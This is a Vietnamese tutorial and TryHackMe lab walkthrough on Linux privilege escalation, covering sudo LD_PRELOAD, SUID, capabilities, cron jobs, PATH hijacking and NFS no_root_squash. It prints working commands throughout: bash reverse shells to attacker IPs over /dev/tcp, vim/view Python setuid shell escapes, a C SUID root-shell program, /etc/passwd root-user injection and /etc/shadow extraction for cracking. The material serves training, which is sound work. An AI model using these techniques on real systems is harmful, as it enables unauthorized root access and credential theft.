Chạy chương trình mà bạn có quyền sudo, ví dụ `find`, bằng cách sử dụng:

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

Ngay khi `find` chạy, hệ thống sẽ:

1. Nạp thư viện `shell.so`
2. Gọi hàm `_init()` —→ mở một **shell root**
3. Bạn giờ đây có `#` thay vì `$`

<figure><img src="../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

Điều này sẽ dẫn đến việc mở một shell với **quyền root**.



### 2. Thực hành với lab tryhackme

#### infomation

<figure><img src="../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>

```
Username: karen
Password: Password1
```

`Mục tiêu của ta chính là leo quyền từ normal user để lên root và đọc file chứa flag`



Đầu tiên ta sẽ access vào cred mà lab cấp cho chúng ta&#x20;

<figure><img src="../.gitbook/assets/image (375).png" alt=""><figcaption></figcaption></figure>

#### recon

Ta sẽ tiến hành sử dụng lệnh `sudo -l` để kiểm tra xem ta có thể chạy lệnh nào với `sudo`

<figure><img src="../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

User `karen` có quyền `sudo` không cần mật khẩu với `find`, `less`, và `nano`. Cả ba lệnh này đều có thể bị lợi dụng để leo thang đặc quyền lên root (theo GTFOBins), ví dụ `sudo find . -exec /bin/sh \;`

Ta nhận thấy rằng , bản thân hoàn toàn có thể dùng lệnh less để có thể đọc được file chứa flag.

Tiếp theo ta sẽ sử dụng lệnh `find` để tìm vị trí của file chứa flag :&#x20;

```bash
$ find . -name flag2.txt 2>/dev/null
./home/ubuntu/flag2.txt
```

#### EXPLOIT

```
$ sudo /usr/bin/less ./home/ubuntu/flag2.txt
```

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Và ta hoàn toàn có thể đọc được cả file `/etc/shadow`

```bash
sudo /usr/bin/less /etc/shadow
```

<figure><img src="../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

Và ta cần chú ý thêm 1 kĩ thuật nữa tôi mò được trong [link ](https://gtfobins.github.io/gtfobins/nano/#sudo)

<figure><img src="../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

Và sau khi thực thi xong , ta sẽ có được quyền `root`

<figure><img src="../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>



⇒ Tóm lại thì ở phần này thì ta có khá nhiều cách để có thể leo lên được quyền `root`



## VI. Privilege Escalation: SUID

### 1. lý thuyết

#### Kiểm soát đặc quyền trong Linux thông qua quyền truy cập tệp

Hầu hết cơ chế kiểm soát đặc quyền trong Linux đều dựa trên cách kiểm soát mối quan hệ giữa người dùng và tệp thông qua các quyền truy cập.

Các tệp có thể được gán các quyền:

* Đọc (read)
* Ghi (write)
* Thực thi (execute)

Những quyền này được áp dụng cho các người dùng tùy theo mức đặc quyền của họ.

***

#### Giới thiệu về SUID và SGID

Các quyền đặc biệt có thể làm thay đổi cách chương trình được thực thi. Bao gồm:

* SUID (Set-User ID): Khi tệp có bit SUID, nó sẽ chạy với quyền của chủ sở hữu tệp (thường là root), thay vì quyền của người thực thi.
* SGID (Set-Group ID): Tương tự, chương trình sẽ chạy với quyền của nhóm sở hữu tệp.

Tệp có SUID/SGID sẽ hiển thị ký tự “s” trong phần quyền truy cập khi dùng lệnh `ls -l`.

***

#### Liệt kê các tệp có gán bit SUID

Sử dụng lệnh sau để tìm các tệp có bit SUID được thiết lập:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

***

#### So sánh với GTFOBins để tìm khả năng khai thác

Một phương pháp thực hành tốt là so sánh các tệp vừa tìm được với trang GTFOBins: [https://gtfobins.github.io](https://gtfobins.github.io)

<figure><img src="../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

Bạn có thể lọc các chương trình có thể khai thác khi có SUID bằng liên kết:\
[https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)

***

#### Ví dụ với `nano` có gán SUID

Danh sách tìm kiếm trên cho thấy trình soạn thảo văn bản `nano` có SUID. Tuy nhiên, GTFOBins không cung cấp một phương pháp khai thác rõ ràng.

Đây là tình huống thường gặp trong thực tế: không có phương pháp "đường tắt", mà bạn cần kết hợp nhiều bước trung gian để tận dụng bất kỳ đặc quyền nào bạn có được.

Lưu ý: Máy ảo được cung cấp trong bài này còn có một tệp nhị phân khác ngoài `nano` cũng có gán SUID.

***

#### Khai thác SUID trên `nano`

Do `nano` được sở hữu bởi root và có SUID, bạn có thể sử dụng `nano` để:

* Đọc các tệp hệ thống nhạy cảm (ví dụ: `/etc/shadow`)
* Ghi nội dung vào các tệp hệ thống (ví dụ: `/etc/passwd`)



**Đọc tệp `/etc/shadow`**

Chúng ta nhận thấy trình soạn thảo văn bản `nano` có SUID được thiết lập bằng cách chạy lệnh:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

⇒ Lệnh này giúp bạn **liệt kê toàn bộ các chương trình có SUID**, trong đó có thể bao gồm `nano`

```bash
nano /etc/shadow
```

sẽ hiển thị nội dung của tệp `/etc/shadow`. Bây giờ chúng ta có thể sử dụng công cụ `unshadow` để tạo một tệp có thể bị crack bằng công cụ John the Ripper. Để làm được điều này, `unshadow` cần cả hai tệp `/etc/shadow` và `/etc/passwd`.

<figure><img src="../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

***

#### Cách sử dụng công cụ `unshadow` được thể hiện dưới đây:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

<figure><img src="../.gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>

* `unshadow`: Công cụ trong bộ `John the Ripper`, kết hợp hai tệp `/etc/passwd` và `/etc/shadow` thành định dạng duy nhất.
* `>`: Ghi kết quả vào tệp `passwords.txt`

Tệp `passwords.txt` sẽ là đầu vào cho quá trình **crack mật khẩu**.

***

Với wordlist phù hợp và một chút may mắn, **John the Ripper** có thể khôi phục được một hoặc nhiều mật khẩu ở dạng văn bản thuần túy. Để biết thêm chi tiết về công cụ này, bạn có thể truy cập:

[https://tryhackme.com/room/johntheripperbasics](https://tryhackme.com/room/johntheripperbasics)

***

Tùy chọn khác là thêm một người dùng mới có quyền root. Điều này giúp bỏ qua quá trình crack mật khẩu vốn tốn thời gian. Dưới đây là một cách thực hiện đơn giản:

Chúng ta sẽ cần hash của mật khẩu mà người dùng mới sẽ sử dụng. Có thể tạo nhanh bằng công cụ `openssl` trên Kali Linux:

```bash
openssl passwd -1 -salt THM password1
```

<figure><img src="../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

* `openssl passwd`: Tạo hash mật khẩu theo chuẩn UNIX
* `-1`: Sử dụng thuật toán `MD5-based` (tương thích với hệ thống cũ)
* `-salt THM`: Chọn chuỗi salt tùy ý (ở đây là “THM”)
* `password1`: mật khẩu bạn muốn dùng

***

Sau đó, chúng ta thêm dòng chứa username và hash vào tệp `/etc/passwd`.

<figure><img src="../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

***

Sau khi người dùng mới được thêm vào (lưu ý rằng `/bin/bash` được sử dụng để cung cấp shell root), chúng ta cần chuyển sang người dùng đó và hy vọng sẽ có quyền root.

<figure><img src="../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

***

#### Tóm tắt

* SUID cho phép chương trình chạy với quyền của chủ sở hữu
* `nano` với SUID có thể được dùng để đọc hoặc sửa tệp hệ thống
* Có thể sử dụng hai hướng:
  * Đọc và bẻ mật khẩu từ `/etc/shadow`
  * Thêm người dùng có quyền root trực tiếp vào `/etc/passwd`



### 2. Thực hành với lab tryhackme



#### infomation

<figure><img src="../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

```
Username: karen
Password: Password1
```

`Mục tiêu của ta chính là leo quyền từ normal user để lên root và đọc file chứa flag`



#### recon



Đầu tiên ta sẽ sử dụng lệnh find bên dưới đẻ liệt kê toàn bộ các chương trình có SUID

```
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

Sau khi đối chiếu với [link](https://gtfobins.github.io/#+suid)  thì tôi đã tìm được phương án để có thể leo quyền&#x20;

<figure><img src="../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

MỤC ĐÍCH : Lợi dụng chương trình `base64` khi được gán SUID để **đọc tệp hệ thống** mà người dùng thường không có quyền truy cập (như `/etc/shadow`).

1. **Tạo bản sao `base64` có SUID:**

```bash
sudo install -m =xs $(which base64) .
```

2. **Đặt tên tệp cần đọc:**

```bash
LFILE=/etc/shadow
```

3. **Đọc nội dung tệp:**

```bash
b./base64 "$LFILE" | base64 --decode
```

<figure><img src="../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

#### EXPLOIT

Nhiệm vụ bây giờ của ta chính là dùng công cụ để băm tìm ra mật khẩu của user2

```
$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
```

Đến đây thì chúng ta có thể làm theo cách ở bên trên [#cach-su-dung-cong-cu-unshadow-duoc-the-hien-duoi-day](linux-privilege-escalation-basic.md#cach-su-dung-cong-cu-unshadow-duoc-the-hien-duoi-day "mention")

hoặc có thể sử dụng nhanh bằng công cụ [hashes](https://hashes.com/en/decrypt/hash)&#x20;

<figure><img src="../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

Bây h t chỉ cần su vào tài khoản user2 để đi tìm flag&#x20;

```bash
$ find / -name flag3.txt 2>/dev/null      
/home/ubuntu/flag3.txt
```

Và ta hoàn toàn không thể đọc theo cách thông thường

```bash
$ cat /home/ubuntu/flag3.txt
cat: /home/ubuntu/flag3.txt: Permission denied
```

Ta sẽ tiếp tục sử dụng kĩ thuật ở trên mà ta đã làm với file `/etc`/shadow ở bên trên

```bash
$ LFILE=/home/ubuntu/flag3.txt
$ /usr/bin/base64 "$LFILE" | base64 --decode
THM-3847834
```



## VII. Privilege Escalation: Capabilities

### 1. lí thuyết

#### Giới thiệu về Capabilities

Trong Linux, capabilities là một cách để phân quyền chi tiết hơn cho các tiến trình hoặc tập tin nhị phân. Thay vì cấp quyền root hoàn toàn cho một chương trình (thường thông qua SUID), capabilities cho phép chỉ cấp những quyền cần thiết.

Ví dụ: một công cụ cần tạo kết nối mạng thông qua socket sẽ không chạy được với người dùng thường. Tuy nhiên, nếu tập tin nhị phân được cấp capabilities phù hợp (như `cap_net_bind_service`), người dùng đó vẫn có thể sử dụng công cụ mà không cần quyền root.

Điều này giúp giảm rủi ro bảo mật khi so với việc sử dụng SUID bit.

***

#### Kiểm tra Capabilities trên hệ thống

Lệnh sau dùng để liệt kê tất cả các tập tin có capabilities đang được thiết lập:

```bash
getcap -r / 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

> Lưu ý: Lệnh `getcap -r /` có thể sinh ra rất nhiều lỗi nếu người dùng không có quyền truy cập vào một số thư mục, vì vậy ta chuyển hướng lỗi sang `/dev/null`.

***

#### Phân tích tình huống cụ thể

Trong trường hợp này, ta kiểm tra tập tin `vim`:

```bash
alper@targetsystem:~$ ls -l /usr/bin/vim
lrwxrwxrwx 1 root root 21 Jun 16 00:43 /usr/bin/vim → /etc/alternatives/vim

alper@targetsystem:~$ ls -l /home/alper/vim
-rwxr-xr-x 1 root root 2906824 Jun 16 02:06 /home/alper/vim
```

Không có tập tin nào có SUID bit, do đó phương pháp leo thang đặc quyền bằng SUID sẽ không áp dụng được ở đây. Tuy nhiên, nếu `vim` có capabilities phù hợp, ta vẫn có thể khai thác.

***

#### Sử dụng GTFOBins và khai thác với Vim

GTFOBins là một nguồn đáng tin cậy để tra cứu các cách khai thác các tập tin nhị phân phổ biến khi có quyền truy cập hoặc capabilities nhất định.

Trong trường hợp này, `vim` có thể được sử dụng để thực thi lệnh Python nâng quyền lên root:

```bash
alper@targetsystem:~$ id
uid=1000(alper) gid=1000(alper) groups=1000(alper),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)

alper@targetsystem:~$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Giải thích:

* `:py3` là lệnh để chạy mã Python 3 trong môi trường `vim`.
* `os.setuid(0)` đặt UID của tiến trình hiện tại về root (0).
* `os.execl(...)` tạo một shell mới với quyền root.

***

#### Kết quả sau khi khai thác thành công

```bash
# id
uid=0(root) gid=1000(alper) groups=1000(alper),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
#
```

Shell hiện tại đã được nâng quyền thành root.

***

#### Tổng kết

* Capabilities là một phương pháp kiểm soát quyền chi tiết hơn so với SUID.
* Các công cụ như `getcap` giúp dò tìm những tập tin có capabilities.
* `vim`, khi có capabilities phù hợp, có thể bị khai thác để leo thang đặc quyền.
* Luôn kiểm tra với GTFOBins để xác định các phương pháp khai thác tương ứng với tập tin nhị phân trên hệ thống.



### 2. Thực hành với lab tryhackme

#### infomation

<figure><img src="../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

```
Username: karen
Password: Password1
```

`Mục tiêu của ta chính là leo quyền từ normal user để lên root và đọc file chứa flag`



#### recon



Tôi sẽ sử dụng lệnh bên dưới để liệt kê tất cả các tập tin có capabilities đang được thiết lập

```bash
getcap -r / 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

Kết quả `getcap -r / 2>/dev/null` cho thấy một số binary có capabilities nguy hiểm:

* `ping`, `mtr-packet`, `traceroute6.iputils` → `cap_net_raw+ep`: có thể dùng raw socket, tiềm năng sniffing, spoofing.
* `gst-ptp-helper` → `cap_net_bind_service`, `cap_net_admin`: có quyền mở cổng <1024 và chỉnh cấu hình mạng.
* `/home/karen/vim`, `/home/ubuntu/view` → `cap_setuid+ep`: **cực kỳ nguy hiểm**, có thể dùng để **escalate lên root**.

_Kết quả trả về của lệnh `ls -l` cho thấy file `/home/karen/vim` thuộc sở hữu root → càng tăng khả năng leo thang đặc quyền nếu khai thác được._ Hoặc là ta cũng có thể sử dụng `view` để có thể làm được điều tương tự&#x20;



`cap_setuid` là một **Linux capability** cho phép một tiến trình **thay đổi UID (User ID)** của chính nó hoặc của tiến trình khác.

* `+ep` là viết tắt của:
  * `e`: **effective** — capability có hiệu lực khi chạy
  * `p`: **permitted** — capability được phép sử dụng

⇒  Khi một binary có `cap_setuid+ep`, nó **có thể chuyển UID sang bất kỳ người dùng nào**, bao gồm cả `root (UID 0)` — mà **không cần setuid bit hoặc quyền root truyền thống**.



#### exploit

Ta sẽ tiến hành khai thác bằng `view`  [link](https://gtfobins.github.io/gtfobins/view/#capabilities)

<figure><img src="../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

Binary `view` có `cap_setuid+ep`, cho phép thay đổi UID hiệu lực. Nếu `view` được biên dịch với hỗ trợ Python (`+python` hoặc `+python3`), ta có thể dùng lệnh:

```bash
./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

để mở shell với quyền **root (UID 0)**.\
Nếu dùng Python 3 thì thay `:py` bằng `:py3`.



<figure><img src="../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>



Bước cuối cùng thì đơn giản rồi&#x20;

```bash
# find / -name flag4.txt 2>/dev/null
/home/ubuntu/flag4.txt
# cat /home/ubuntu/flag4.txt
THM-9349843
```



## VIII. Privilege Escalation: Cron Jobs

### 1. lý thuyết

#### Cron Jobs và vector leo thang đặc quyền

Cron jobs được sử dụng để chạy các script hoặc chương trình tại thời điểm xác định. Theo mặc định, chúng chạy với quyền của người sở hữu script, không phải người dùng hiện tại.\
Mặc dù cron jobs được cấu hình đúng cách thì không dễ bị khai thác, nhưng trong một số điều kiện nhất định, chúng **có thể trở thành vector leo thang đặc quyền**.

**Ý tưởng chính**: Nếu có một tác vụ được lên lịch để chạy với quyền root và bạn có thể chỉnh sửa script được thực thi, thì script của bạn sẽ chạy với quyền root.

***

#### Xem cấu hình crontab

Cấu hình cron được lưu trong các tệp **crontab** (cron table). Bạn có thể dùng nó để xem khi nào một tác vụ sẽ chạy tiếp theo.

* Mỗi user trên hệ thống có tệp crontab riêng và có thể định nghĩa các tác vụ chạy dù đã đăng xuất.
* Mục tiêu của bạn là **tìm một cron job chạy dưới quyền root** và thay đổi nội dung script được chạy.

Bất kỳ user nào cũng có thể đọc cron job hệ thống tại:

```bash
/etc/crontab
```

<figure><img src="../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

Trong môi trường CTF, bạn sẽ thấy các cron job thường chạy mỗi phút hoặc mỗi 5 phút.\
Trong các tình huống pentest thực tế, chúng thường chạy hàng ngày, hàng tuần hoặc hàng tháng.

***

#### Ví dụ: backup.sh bị lợi dụng

Tệp `backup.sh` được cấu hình để chạy **mỗi phút**. Nội dung ban đầu của nó chỉ đơn giản là tạo backup của file `prices.xls`:

<figure><img src="../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

```bash
#!/bin/bash
BACKUPTIME=`date +%b-%d-%y`
DESTINATION=/home/alper/Documents/backup-$BACKUPTIME.tar.gz
SOURCEFOLDER=/home/alper/Documents/commercial/prices.xls
tar -czpf $DESTINATION $SOURCEFOLDE
```



Vì user hiện tại có thể chỉnh sửa script này, chúng ta có thể thay thế nó bằng một reverse shell để leo thang đặc quyền.

***

#### Thay nội dung script để tạo reverse shell

Script được thay đổi thành:

<figure><img src="../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.2.15/6666 0>&1
```

**Lưu ý:**

* Cú pháp lệnh có thể thay đổi tùy theo công cụ có sẵn trên máy mục tiêu (ví dụ: `nc` có thể không hỗ trợ tùy chọn `-e`)
* Nên sử dụng reverse shell thay vì bind shell để tránh làm gián đoạn hệ thống thực trong môi trường pentest.

***

#### Bật listener trên máy tấn công

Trên máy tấn công, bật listener:

```bash
nc -nlvp 6666
```

<figure><img src="../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

Khi kết nối đến từ máy mục tiêu, bạn sẽ có được một reverse shell với quyền root:

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

***

#### Khai thác sai sót quản lý thay đổi cron job

Cron jobs là điểm cần kiểm tra trong pentest vì sai sót sau khá phổ biến:

1. Quản trị viên tạo cron job để chạy một script định kỳ
2. Sau một thời gian, script không còn hữu ích nên bị xóa
3. Nhưng cron job vẫn còn tồn tại
4. Không ai kiểm tra hoặc dọn dẹp cron job cũ

Đây là một lỗ hổng tiềm năng cho attacker lợi dụng.

<figure><img src="../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

***

#### Tình huống: antivirus.sh bị xóa nhưng cron job vẫn tồn tại

Ví dụ sau minh họa một cron job gọi `antivirus.sh`, nhưng script này đã bị xóa:

```bash
* * * * * root antivirus.sh
```

Khi kiểm tra với lệnh:

```bash
$ locate antivirus.sh
```

Không có file nào được tìm thấy.

Do đường dẫn trong cron job không tuyệt đối, cron sẽ sử dụng các thư mục trong biến môi trường `PATH` (như `/home/user`).\
Vì vậy, attacker có thể tạo file `antivirus.sh` trong thư mục home:

<figure><img src="../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.2.15/7777 0>&1
```

Sau đó bật listener trên máy tấn công:

```bash
nc -nlvp 7777
```

Khi kết nối thành công, shell bạn nhận được sẽ có quyền root.

<figure><img src="../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

***

#### Gợi ý khai thác nâng cao

Nếu bạn phát hiện cron job đang sử dụng các công cụ như:

* `tar`
* `7z`
* `rsync`

Hãy phân tích thật kỹ. Các công cụ này có thể bị khai thác thông qua tính năng **wildcard (`*`)** để thực thi lệnh ngoài ý muốn.





### 2. Thực hành với lab tryhackme





#### recon



Đầu tiên ta sẽ tiến hành đọc file `/etc/crontab` để kiểm tra cấu hình

<figure><img src="../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

Từ kết quả `crontab`, ta thấy có một vài tập tin script được thiết lập để chạy tự động trên từng phút.

```bash
* * * * * root /antivirus.sh
* * * * * root antivirus.sh
* * * * * root /home/karen/backup.sh
* * * * * root /tmp/test.py
```

Lệnh `ls -l` cho thấy:

* `/antivirus.sh` và `antivirus.sh` không tồn tại hoặc không thể truy cập.
* `/home/karen/backup.sh` **tồn tại** và được sở hữu bởi user `karen`, có quyền đọc cho mọi user (`-rw-r--r--`).
* `/tmp/test.py` không tồn tại.

Vì vậy, ta sẽ tập trung phân tích vào file `/home/karen/backup.sh`.

```bash
$ cat /home/karen/backup.sh
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
```

đây là 1 bash script thực hiện nhiệm vụ di chuyển vào `/home/admin/1/2/3/Results`&#x20;

Sau đó **nén toàn bộ file trong thư mục này** vào file `/home/admin/download.zip`

&#x20;

⇒ Ta hoàn toàn có thể lợi dụng việc các tệp này được chạy tự động nên  ta có thể chèn shell vào trong file `backup.sh` này để lợi dụng và leo lên quyền admin.

Ta sẽ tiến hành sửa lại nội dung trong file thành shell như bên dưới&#x20;

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.201.50.13/7777 0>&1
```

Và cấp quyền thực thi cho file.

Sau đó bật listener trên máy tấn công:

```bash
nc -nlvp 7777
```

Khi kết nối thành công, shell bạn nhận được sẽ có quyền root.

<figure><img src="../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

Sau khi đã có quyền `root` rồi thì bước cuối cùng ta chỉ cần đọc flag thôi :3&#x20;

```bash
root@ip-10-201-50-13:~# find / -name flag5.txt 2>/dev/null
find / -name flag5.txt 2>/dev/null
/home/ubuntu/flag5.txt
root@ip-10-201-50-13:~# cat /home/ubuntu/flag5.txt
cat /home/ubuntu/flag5.txt
THM-383000283
```



## IX. Privilege Escalation: PATH

### 1. lý thuyết



#### **Trong Linux, biến môi trường PATH xác định nơi hệ thống tìm kiếm các tập tin thực thi.**

Nếu một thư mục có quyền ghi được đưa vào PATH, kẻ tấn công có thể chiếm quyền điều khiển ứng dụng để thực thi một script độc hại.

***

#### **Các bước khai thác:**

1.  **Xác định các thư mục có quyền ghi trong biến PATH** bằng lệnh sau:

    ```bash
    find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
    ```
2.  **Kiểm tra khả năng chỉnh sửa PATH**, và thêm một thư mục có quyền ghi nếu cần:

    ```bash
    export PATH=/tmp:$PATH
    ```
3.  **Đặt một script độc hại (ví dụ: bản sao của `/bin/bash`) vào thư mục có quyền ghi**, và gán quyền thực thi cho nó:

    ```bash
    cp /bin/bash /tmp/fake_binary
    chmod +x /tmp/fake_binary
    ```
4. Nếu **một script SUID gọi một tập tin thực thi mà không dùng đường dẫn tuyệt đối**, script của kẻ tấn công sẽ được thực thi với quyền cao hơn (privilege escalation).

***

#### **Những điểm cần ghi nhớ:**

* Luôn **kiểm tra các thư mục có quyền ghi trong PATH** để đề phòng khả năng bị chiếm quyền.
* Việc **chỉnh sửa PATH** có thể cho phép **tiêm vào các chương trình giả mạo**, nhằm leo thang đặc quyền.
* Các **script SUID dùng PATH thay vì đường dẫn tuyệt đối** có thể bị khai thác nghiêm trọng.



### 2. Thực hành với lab tryhackme





sau khi sử dụng lệnh để tìm ra những file mà ta có quyền ghi vào thì tôi phát hiện 1 điểm bất thường khi ta có thể ghi đè vào file của 1 user

<figure><img src="../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

Tiếp theo tôi sẽ cd vào thư mục đó để kiểm tra về khả năng leo quyền&#x20;

```bash
$ cd murdoch
$ ls -l
total 24
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
```

Ta thấy được là cso 2 file , `test` và `thm.py`

#### Phân tích file `test`

```bash
$ file test
test: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped
```

Dòng này cho ta biết:

* Đây là một **ELF file thực thi 64-bit**
* Quan trọng nhất: **setuid** được bật và owner là `root` → nghĩa là khi ta thực thi file này, nó sẽ chạy với **quyền root**!

Đây là điểm cực kỳ quan trọng để **leo thang đặc quyền.**

#### Phân tích nội dung `thm.py`

```python
#!/usr/bin/python3

import os
import sys

try:
    os.system("thm")
except:
    sys.exit()
```

Script Python này đơn giản thực thi lệnh shell `"thm"` – nhưng **không chỉ định đường dẫn tuyệt đối**, nên sẽ tìm theo `$PATH`.

→ Đây là một **điểm yếu có thể khai thác thông qua PATH hijacking**.



Giả sử `test` thực thi `thm.py`, và `thm.py` thực thi `"thm"` qua `os.system`. Khi file `test` chạy, vì nó có setuid root → `thm.py` chạy với quyền root → `os.system("thm")` cũng chạy với quyền root.

Nếu attacker kiểm soát được `$PATH` và đặt một file thực thi tên `thm` ở vị trí đầu tiên trong `$PATH`, thì:

> **Lệnh “thm” trong `os.system` sẽ gọi file độc của attacker dưới quyền root!**



Để đảm bảo file `thm` của attacker được thực thi ta cần **đặt thư mục chứa file này ở đầu biến `$PATH`**:

```bash
$ export PATH=/home/murdoch:$PATH
$ echo $PATH
/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```





```bash
$ find / -name flag6.txt 2>/dev/null
/home/matt/flag6.txt
$ nano thm
Unable to create directory /home/karen/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

$ cat thm
cat /home/matt/flag6.txt

$ chmod 777 thm
```

Tã sẽ tạo 1 file thm giả để lừa hệ thống, hệ thống sẽ giúp ta thực thi việc đọc flag

<figure><img src="../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>



→ Khi đó, do `thm.py` gọi `os.system("thm")`, chương trình sẽ thực thi script `thm` của attacker dưới **quyền root** → có thể đọc được nội dung flag ở `/home/matt/flag6.txt`.

```bash
$ ./test
THM-736628929
```



## X. Privilege Escalation: NFS

### 1. lý thuyết&#x20;

#### Leo thang đặc quyền không chỉ giới hạn ở các khai thác nội bộ

Việc leo thang đặc quyền không chỉ xuất hiện trong các lỗ hổng hệ thống cục bộ. Các giao thức truy cập từ xa như **SSH**, **Telnet**, và đặc biệt là các cấu hình sai của **NFS (Network File System)** cũng có thể dẫn đến việc chiếm quyền **root** trực tiếp từ xa.

***

#### Các phương pháp chính

#### 1. Rò rỉ khóa riêng SSH

Nếu kẻ tấn công thu được **khóa riêng SSH của người dùng root**, họ có thể **truy cập trực tiếp hệ thống với quyền root**, mà không cần thực hiện bất kỳ kỹ thuật leo thang đặc quyền nào tại chỗ.

Đây là một trong những cách đơn giản nhưng cực kỳ nguy hiểm để chiếm quyền kiểm soát hệ thống từ xa.

#### 2. Khai thác NFS cấu hình sai

**Cấu hình nằm ở đâu**

Các cấu hình của NFS được định nghĩa trong tập tin `/etc/exports`.

<figure><img src="../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

**Ý nghĩa của tùy chọn `no_root_squash`**

Theo mặc định, khi người dùng root từ máy khách NFS tạo file, hệ thống sẽ ánh xạ quyền thành người dùng `nfsnobody` nhằm giới hạn rủi ro.

Tuy nhiên, nếu sử dụng tùy chọn `no_root_squash`, các file vẫn giữ nguyên quyền root gốc, dẫn đến lỗ hổng nghiêm trọng.

**Quy trình khai thác**

1.  **Liệt kê các chia sẻ có thể mount**:

    ```bash
    showmount -e <địa_chỉ_IP_đối_tượng>
    ```
2.  **Mount thư mục chia sẻ bị lỗi cấu hình**:

    ```bash
    mount -o rw <IP>:/export /mnt/nfs
    ```
3.  **Tạo một file thực thi có quyền root (SUID binary)**:

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main() {
        setuid(0);
        system("/bin/bash");
        return 0;
    }
    ```
4.  **Biên dịch và gán quyền SUID cho file**:

    ```
    gcc nfs.c -o nfs
    chmod +s nfs
    ```
5.  **Thực thi trên hệ thống mục tiêu để chiếm shell root**:

    ```
    ./nfs
    ```

***

#### Kết luận

* Cần kiểm tra kỹ hệ thống bị xâm nhập xem có tồn tại khóa SSH riêng hay không, đặc biệt là khóa của người dùng root.
* Cấu hình sai NFS với tùy chọn `no_root_squash` có thể mở ra một con đường dễ dàng để leo thang đặc quyền.
* Kết hợp nhiều kỹ thuật tấn công từ xa sẽ giúp quá trình chiếm quyền root diễn ra nhanh chóng và hiệu quả hơn.



### 2. Thực hành với lab tryhackme

#### 1. Kiểm tra thư mục chia sẻ

Từ máy Kali (attacker), liệt kê các thư mục được chia sẻ từ máy victim:

```bash
showmount -e 10.201.30.179
```

Kết quả:

```bash
/home/ubuntu/sharedfolder *
/tmp                        *
/home/backup                *
```

Trong file `/etc/exports` của máy victim, thư mục `/home/ubuntu/sharedfolder` có tùy chọn:

```
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Đây là điều kiện lý tưởng để khai thác: cho phép ghi và không hạ quyền root.

***

#### 2. Mount thư mục từ victim

Trên máy Kali:

```bash
mkdir /tmp/adudu
mount -o rw 10.201.30.179:/home/ubuntu/sharedfolder /tmp/adudu
cd /tmp/adudu
```

***

#### 3. Tạo payload SUID shell

